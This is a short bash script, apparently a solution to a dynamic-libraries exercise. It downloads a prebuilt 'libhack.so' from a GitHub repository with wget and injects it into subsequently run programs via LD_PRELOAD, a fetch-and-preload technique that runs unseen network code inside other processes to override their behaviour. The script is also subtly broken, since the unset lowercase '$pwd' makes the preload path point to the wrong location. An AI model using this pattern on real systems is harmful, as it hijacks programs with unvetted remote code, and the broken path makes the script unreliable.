#!/bin/bash
wget -P .. https://raw.githubusercontent.com/Rockjunior/alx-low_level_programming/master/0x18-dynamic_libraries/libhack.so
export LD_PRELOAD="$pwd/../libhack.so"
